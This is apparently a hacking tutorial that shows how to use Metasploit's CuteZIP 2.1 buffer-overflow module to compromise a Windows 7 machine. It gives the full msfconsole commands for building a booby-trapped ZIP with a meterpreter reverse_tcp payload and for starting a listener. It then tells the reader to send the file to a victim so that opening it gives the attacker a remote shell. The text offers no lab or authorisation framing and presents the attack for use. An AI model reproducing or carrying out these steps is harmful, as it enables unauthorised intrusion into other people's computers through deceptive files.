Hack Remote Windows 7 PC using global SCAPE Cute ZIP Stack Buffer Overflow

This module exploits stack-based buffer overflow vulnerability in version 2.1 of CuteZIP. In order for the command to be executed, an attacker must convince the target user to open a specially crafted zip file with CuteZIP. By doing so, an attacker can execute arbitrary code as the target user.
CuteZIP 2.1
Attacker: Backtrack 5
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/cutezip_bof
msf exploit (cutezip_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (cutezip_bof)>set lhost 192.168.1.2 (IP of Local Host)
msf exploit (cutezip_bof)>exploit

After we successfully generate the malicious ZIP File, it will stored on your local computer
/root/.msf4/local/msf.zip

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your msf.zip files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
